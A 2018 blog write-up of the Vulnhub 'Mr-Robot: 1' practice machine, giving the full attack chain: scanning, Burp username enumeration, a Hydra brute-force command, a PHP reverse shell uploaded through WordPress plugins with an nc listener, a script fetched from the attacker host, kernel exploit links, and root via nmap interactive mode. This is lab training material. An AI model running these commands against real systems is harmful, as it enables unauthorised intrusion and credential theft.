---
title: "[Vulnhub] Mr-Robot: 1 Write-up"
date: 2018-08-22
author: "Mars Cheng"
summary: "Overview This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any mistake or suggestion, please let we konw. Thanks. Walkthrough 1. Inf..."
translationKey: "vulnhub-mr-robot-1-write-up"
slug: "vulnhub-mr-robot-1-write-up"
aliases:
  - /blog/2018/vulnhub-mr-robot-1-write-up/
  - /2018/vulnhub-mr-robot-1-write-up/
tags:
  - "Penetration Testing"
  - "Vulnhub"
  - "OSCP"
  - "Write-up"
---

## Overview

>This is a vulnerable machine from vulnhub, and the write-up refers some internet resources. If any 
mistake or suggestion, please let we konw. Thanks.


## Walkthrough

1. Information gathering 
2. Username enumeration with Burp Suite and password cracking with Hydra
3. Upload webshell to Wordpress and get reverse shell
4. Search vulnerable service 
5. Get root privilege

### 1. Information gathering

As usual, we firstly use Nmap to scan the machine which tool can discover machine port status, service, and version. 
* This machine only provide web service.

```java
[17:11:39] root:~ # nmap -A 192.168.2.17 
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-20 17:13 CST
Nmap scan report for 192.168.2.17
Host is up (0.0020s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
MAC Address: 00:0C:29:C1:EF:3C (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   2.02 ms 192.168.2.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.15 seconds

```
![](https://i.imgur.com/onxK2LP.png)


* Before we browse web, we enumerate web page, and we find the robots.txt, /wp-login, /wp-config, and son on. We make sure this machine offer the wordpress service.

```java
[17:13:42] root:~ #  dirb http://192.168.2.17

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Aug 20 17:17:49 2018
URL_BASE: http://192.168.2.17/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.17/ ----
==> DIRECTORY: http://192.168.2.17/0/                                                                                                                                             
==> DIRECTORY: http://192.168.2.17/admin/                                                                                                                                         
+ http://192.168.2.17/atom (CODE:301|SIZE:0)                                                                                                                                      
==> DIRECTORY: http://192.168.2.17/audio/                                                                                                                                         
==> DIRECTORY: http://192.168.2.17/blog/                                                                                                                                          
==> DIRECTORY: http://192.168.2.17/css/                                                                                                                                           
+ http://192.168.2.17/dashboard (CODE:302|SIZE:0)                                                                                                                                 
+ http://192.168.2.17/favicon.ico (CODE:200|SIZE:0)                                                                                                                               
==> DIRECTORY: http://192.168.2.17/feed/                                                                                                                                          
==> DIRECTORY: http://192.168.2.17/image/                                                                                                                                         
==> DIRECTORY: http://192.168.2.17/Image/                                                                                                                                         
==> DIRECTORY: http://192.168.2.17/images/                                                                                                                                        
+ http://192.168.2.17/index.html (CODE:200|SIZE:1188)                                                                                                                             
+ http://192.168.2.17/index.php (CODE:301|SIZE:0)                                                                                                                                 
+ http://192.168.2.17/intro (CODE:200|SIZE:516314)                                                                                                                                
==> DIRECTORY: http://192.168.2.17/js/                                                                                                                                            
+ http://192.168.2.17/license (CODE:200|SIZE:19930)                                                                                                                               
+ http://192.168.2.17/login (CODE:302|SIZE:0)                                                                                                                                     
+ http://192.168.2.17/page1 (CODE:301|SIZE:0)                                                                                                                                     
+ http://192.168.2.17/phpmyadmin (CODE:403|SIZE:94)                                                                                                                               
+ http://192.168.2.17/rdf (CODE:301|SIZE:0)                                                                                                                                       
+ http://192.168.2.17/readme (CODE:200|SIZE:7334)                                                                                                                                 
+ http://192.168.2.17/robots (CODE:200|SIZE:41)                                                                                                                                   
+ http://192.168.2.17/robots.txt (CODE:200|SIZE:41)                                                                                                                               
+ http://192.168.2.17/rss (CODE:301|SIZE:0)                                                                                                                                       
+ http://192.168.2.17/rss2 (CODE:301|SIZE:0)                                                                                                                                      
+ http://192.168.2.17/sitemap (CODE:200|SIZE:0)                                                                                                                                   
+ http://192.168.2.17/sitemap.xml (CODE:200|SIZE:0)                                                                                                                               
==> DIRECTORY: http://192.168.2.17/video/                                                                                                                                         
==> DIRECTORY: http://192.168.2.17/wp-admin/                                                                                                                                      
+ http://192.168.2.17/wp-config (CODE:200|SIZE:0)                                                                                                                                 
==> DIRECTORY: http://192.168.2.17/wp-content/                                                                                                                                    
+ http://192.168.2.17/wp-cron (CODE:200|SIZE:0)                                                                                                                                   
==> DIRECTORY: http://192.168.2.17/wp-includes/                                                                                                                                   
+ http://192.168.2.17/wp-links-opml (CODE:200|SIZE:228)                                                                                                                           
+ http://192.168.2.17/wp-load (CODE:200|SIZE:0)                                                                                                                                   
+ http://192.168.2.17/wp-login (CODE:200|SIZE:2668)                                                                                                                               
+ http://192.168.2.17/wp-mail (CODE:403|SIZE:3018)       
+ http://192.168.2.17/wp-settings (CODE:500|SIZE:0)       
+ http://192.168.2.17/wp-signup (CODE:302|SIZE:0)             
+ http://192.168.2.17/xmlrpc (CODE:405|SIZE:42)                                                                           
+ http://192.168.2.17/xmlrpc.php (CODE:405|SIZE:42)              
---- Entering directory: http://192.168.2.17/0/ ----
+ http://192.168.2.17/0/atom (CODE:301|SIZE:0)               
==> DIRECTORY: http://192.168.2.17/0/feed/                           
+ http://192.168.2.17/0/index.php (CODE:301|SIZE:0)               
+ http://192.168.2.17/0/rdf (CODE:301|SIZE:0)                       
+ http://192.168.2.17/0/rss (CODE:301|SIZE:0)                       
+ http://192.168.2.17/0/rss2 (CODE:301|SIZE:0)                       
---- Entering directory: http://192.168.2.17/admin/ ----
+ http://192.168.2.17/admin/atom (CODE:301|SIZE:0)                                                                                  
==> DIRECTORY: http://192.168.2.17/admin/audio/                        
==> DIRECTORY: http://192.168.2.17/admin/css/                          
==> DIRECTORY: http://192.168.2.17/admin/feed/                                    
==> DIRECTORY: http://192.168.2.17/admin/images/                      
+ http://192.168.2.17/admin/index (CODE:200|SIZE:1188)                  
+ http://192.168.2.17/admin/index.html (CODE:200|SIZE:1188)                                                                     
+ http://192.168.2.17/admin/index.php (CODE:301|SIZE:0)                  
+ http://192.168.2.17/admin/intro (CODE:200|SIZE:516314)                  
==> DIRECTORY: http://192.168.2.17/admin/js/                              
+ http://192.168.2.17/admin/rdf (CODE:301|SIZE:0)                              
+ http://192.168.2.17/admin/robot (CODE:200|SIZE:30178875)                                                                      
+ http://192.168.2.17/admin/robots (CODE:200|SIZE:43)                 
+ http://192.168.2.17/admin/robots.txt (CODE:200|SIZE:43)                                                                       
+ http://192.168.2.17/admin/rss (CODE:301|SIZE:0)                                                                      
+ http://192.168.2.17/admin/rss2 (CODE:301|SIZE:0)                                                                       
==> DIRECTORY: http://192.168.2.17/admin/video/                                                                                   
```         



* We first browse robots.txt, the fsocity.dic and key-1-of-3.txt are discovered.

![](https://i.imgur.com/NPmwp6q.png)

![](https://i.imgur.com/Ga0xEsS.png)

* We think file fsocity.dic is username/password dictionary, so we use it and Burp Suite to find the username.

![](https://i.imgur.com/3QSKNJC.png)
* We use forget password function to test username whether exist it or not. 
![](https://i.imgur.com/aSECErC.png)
* Use Burp Suite to interrupt the packet, and send to Intruder. 
![](https://i.imgur.com/SlIs4Qk.png)
* Set user_login=§aaaa§ as payload position.
![](https://i.imgur.com/dlB2yq3.png)
* Load fsocity.dic into payload sets
![](https://i.imgur.com/P8vkLVW.png)
* Run it and find Response of Request 15 is different from other responses. We ensure this site has user Elliot.
![](https://i.imgur.com/WztGouR.png)

### 2. Username enumeration with Burp Suite and password cracking with Hydra
* However, we need to crack the Elliot's password. We use Hydra to crack it, and the password list uses fsocity.dic again.


```java
[11:16:44] root:~ # hydra -l elliot -P /root/Desktop/fsocity.dic 192.168.2.17  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -V -t 64
```


```java
[80][http-post-form] host: 192.168.2.17   login: elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2018-08-21 11:44:10
```

![](https://i.imgur.com/4xGAK8M.png)

* So far, we know username/password elliot/ER28-0652 and log in success.

![](https://i.imgur.com/YHtGeA5.png)

### 3. Upload webshell to Wordpress and get reverse shell

* Now, we want to upload webshell, and we modify php-reverse-shell.php in Kali


* We copy php-reverse-shell.php from /usr/share/webshells/php to /root/Desktop/mrrobot
* We modifuy $ip from 127.0.0.1 to 192.168.2.13

```java
[11:51:54] root:Desktop # cp /usr/share/webshells/php/php-reverse-shell.php /root/Desktop/mrrobot/php-reverse-shell.php
```


![](https://i.imgur.com/IHyoQDW.png)
* In plugins page, we upload webshell

![](https://i.imgur.com/G67Rdbr.png)
* In Media Library, we find webshell which we upload, and we find the path

![](https://i.imgur.com/NTxZcJD.png)

![](https://i.imgur.com/I6qoLYh.png)
* We use nc to build tunnel, then connect to webshell

```java
[11:55:51] root:mrrobot # nc -lvp 1234
listening on [any] 1234 ...
```

![](https://i.imgur.com/dvCMWwp.png)
* Reverse connection success
```java
[11:55:51] root:mrrobot # nc -lvp 1234
listening on [any] 1234 ...
192.168.2.17: inverse host lookup failed: Unknown host
connect to [192.168.2.13] from (UNKNOWN) [192.168.2.17] 48520
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 03:55:58 up  3:17,  0 users,  load average: 0.08, 0.49, 2.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
![](https://i.imgur.com/OtH5AOr.png)


```java
$ python -c "import pty;pty.spawn('/bin/bash')"
daemon@linux:/bin$ ls
ls
bash		   egrep      mountpoint	       sleep
bitnami_ftp_false  false      mt		       ss
bunzip2		   fgconsole  mt-gnu		       stty
bzcat		   fgrep      mv		       su
bzcmp		   findmnt    nano		       sync
bzdiff		   fuser      nc		       tailf
bzegrep		   grep       nc.openbsd	       tar
bzexe		   gunzip     netcat		       tempfile
```

* In /home/robot, we discover key-2-of-3.txt and password.raw-md5. However, We only cat password.raw-md5 with user daemon, the key-2-of-3.txt need robot permission.
* password.raw-md5 --> robot:c3fcd3d76192e4007dfb496cca67e13b
* We use online md5 cracker to crack robot's password, and get password abcdefghijklmnopqrstuvwxyz.

```java
daemon@linux:/home$ ls -al 
ls -al 
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
daemon@linux:/home$ cd robot
cd robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt	password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ ls -all 
ls -all 
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
![](https://i.imgur.com/avPNkKD.png)

* Change user from daemon to robot, and get key-2-of-3.txt success.
  
```java
daemon@linux:/home/robot$ su robot 
su robot 
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

![](https://i.imgur.com/gnVb3dV.png)
### 4. Search vulnerable service 


* We lack last key. And we have some idea : (1) Find kernel exploit (2) Find vulnerable service or software 

```java
[13:54:51] root:html # searchsploit ubuntu 14.04
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                                                       |  Path
                                                                                                                                                     | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation                                                                              | exploits/linux/local/37088.c
Apport 2.14.1 (Ubuntu 14.04.2) - Local Privilege Escalation                                                                                          | exploits/linux/local/36782.sh
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611) - 'ldso_hwcap_64 Stack Clash' Local Privilege Esca | exploits/linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_dynamic Stack Clash' Local Privilege Escalation                  | exploits/linux_x86/local/42276.c
Linux Kernel (Ubuntu 14.04.3) - 'perf_event_open()' Can Race with execve() (Access /etc/shadow)                                                      | exploits/linux/local/39771.txt
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                 | exploits/linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)                            | exploits/linux/local/37293.txt
Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free usb-midi SMEP Privilege Escalation                                             | exploits/linux/local/41999.txt
Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1)                                                                 | exploits/linux/local/39166.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                     | exploits/linux_x86-64/local/40871.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                | exploits/linux/local/43418.c
NetKit FTP Client (Ubuntu 14.04) - Crash/Denial of Service (PoC)                                                                                     | exploits/linux/dos/37777.txt
Ubuntu 14.04/15.10 - User Namespace Overlayfs Xattr SetGID Privilege Escalation                                                                      | exploits/linux/local/41762.txt
WebKitGTK 2.1.2 (Ubuntu 14.04) - Heap based Buffer Overflow                                                                                          | exploits/linux/local/44204.md
usb-creator 0.2.x (Ubuntu 12.04/14.04/14.10) - Local Privilege Escalation                                                                            | exploits/linux/local/36820.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result

```


```java
robot@linux:/tmp$ wget http://192.168.2.13/suggester.sh
wget http://192.168.2.13/suggester.sh
--2018-08-21 06:54:02--  http://192.168.2.13/suggester.sh
Connecting to 192.168.2.13:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 65665 (64K) [text/x-sh]
Saving to: ‘suggester.sh’

100%[======================================>] 65,665      --.-K/s   in 0.001s  

2018-08-21 06:54:02 (80.5 MB/s) - ‘suggester.sh’ saved [65665/65665]

robot@linux:/tmp$ ls
ls
37292.c  exploit  ns_sploit  suggester.sh  vmware-root
robot@linux:/tmp$ chmod 777 suggester.sh
chmod 777 suggester.sh
robot@linux:/tmp$ ./suggester.sh
./suggester.sh

Available information:

Kernel version: 3.13.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: .
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

70 kernel space exploits
32 user space exploits

Possible Exploits:

cat: write error: Broken pipe
[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

cat: write error: Broken pipe
[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Tags: ubuntu=13.10|13.04
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Tags: RHEL<=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Tags: ubuntu=12.04|14.04|14.10|15.04
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Tags: ubuntu=14.04|15.10
   Download URL: https://www.exploit-db.com/download/39166

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

cat: write error: Broken pipe
[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

cat: write error: Broken pipe
[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

cat: write error: Broken pipe
[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/cve-2017-7308/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

cat: write error: Broken pipe
[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Tags: debian=9{glibc:2.24-11+deb9u1},ubuntu=16.04.3{glibc:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required
```

* We fail to promote privilege, so we search any problem of system service. 
* In /usr/local/bin, we discover nmap 3.8.1, and google it for any security issue. 


```
robot@linux:/usr/local/bin$ ls
ls
nmap
robot@linux:/usr/local/bin$ nmap 
nmap 
Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
Some Common Scan Types ('*' options require root privileges)
* -sS TCP SYN stealth port scan (default if privileged (root))
  -sT TCP connect() port scan (default for unprivileged users)
* -sU UDP port scan
  -sP ping scan (Find any reachable machines)
* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
  -sV Version scan probes open ports determining service & app names/versions
  -sR RPC scan (use with other scan types)
```
![](https://i.imgur.com/PRkzpW8.png)
### 5. Get root privilege
* We google some information, and find nmap has ineractive mode which may use root privilege.
* We get key-3-of-3.txt successfully.
```java
robot@linux:/usr/local/bin$ id   
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
robot@linux:/usr/local/bin$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
![](https://i.imgur.com/t8924Kh.png)

### Reference

[1] <https://www.vulnhub.com/entry/mr-robot-1,151/>
[2] <https://security.stackexchange.com/questions/122881/how-does-this-privilege-escalation-vulnerability-on-elastix-work>
